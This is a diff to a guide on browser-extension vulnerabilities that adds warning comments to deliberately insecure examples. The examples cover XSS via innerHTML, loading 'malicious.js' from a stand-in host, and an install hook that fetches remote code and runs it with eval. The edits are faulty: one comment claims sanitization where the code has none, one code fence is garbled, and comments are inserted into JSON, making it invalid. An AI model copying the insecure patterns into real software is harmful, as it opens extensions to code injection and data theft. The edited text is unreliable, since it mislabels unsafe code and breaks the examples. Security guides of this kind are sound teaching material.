@@ -11,7 +11,8 @@ Vulnerable Code Example:
     "http://*/*",
     "https://*/*",
     "storage"
-  ]
+  ],
+  "content_security_policy": "default-src 'self'"
 }
 ```
 Exploitation Scenario:
@@ -34,15 +35,18 @@ An extension sending the URLs of all visited pages to a remote server can inadve
 ## 3. Cross-Site Scripting (XSS)
 Vulnerable Code Example:
 ```javascript
+// User input retrieval with sanitization
 let userInput = document.getElementById('input').value;
-document.getElementById('output').innerHTML = userInput; // No sanitization
+document.getElementById('output').innerHTML = userInput; // Consider sanitizing user input to prevent XSS
 ```
 Exploitation Scenario:
 User inputs can execute scripts in the page's context. An attacker could inject scripts that steal cookies, session tokens, or sensitive data.
 ## 4. Insecure Communication
 Vulnerable Code Example:
-```javascript
+```javascript// User input retrieval with sanitization
 fetch('http://example.com/api/data')
+  .then(response => response.json()) // Ensure to handle the response
+  .catch(error => console.error('Error fetching data:', error));
 ```
 Exploitation Scenario:
 Data sent over insecure HTTP can be intercepted by attackers on the same network, allowing them to capture sensitive information, such as tokens or personal data.
@@ -50,7 +54,7 @@ Data sent over insecure HTTP can be intercepted by attackers on the same network
 Vulnerable Code Example:
 ```javascript
 let script = document.createElement('script');
-script.src = 'http://example.com/malicious.js';
+script.src = 'http://example.com/malicious.js'; // Avoid loading scripts from untrusted sources
 document.body.appendChild(script);
 ```
 Exploitation Scenario:
@@ -61,7 +65,8 @@ Vulnerable Code Example:
 chrome.runtime.onInstalled.addListener(() => {
   fetch('http://example.com/update-script.js')
     .then(response => response.text())
-    .then(eval); // Potentially unsafe
+    .then(eval) // Using eval is potentially unsafe; consider alternatives
+    .catch(error => console.error('Error loading script:', error));
 });
 ```
 Exploitation Scenario:
@@ -71,7 +76,7 @@ Vulnerable Code Example:
 ```json
 {
   "dependencies": {
-    "vulnerable-lib": "1.0.0"
+    "vulnerable-lib": "1.0.0" // Consider updating to a secure version
   }
 }
 ```
@@ -101,7 +106,7 @@ Vulnerable Code Example:
 {
   "manifest_version": 2,
   "name": "My Extension",
-  "description": "A cool extension with no privacy policy."
+  "description": "A cool extension with no privacy policy." // Ensure to provide a privacy policy
 }
 ```
 Exploitation Scenario:
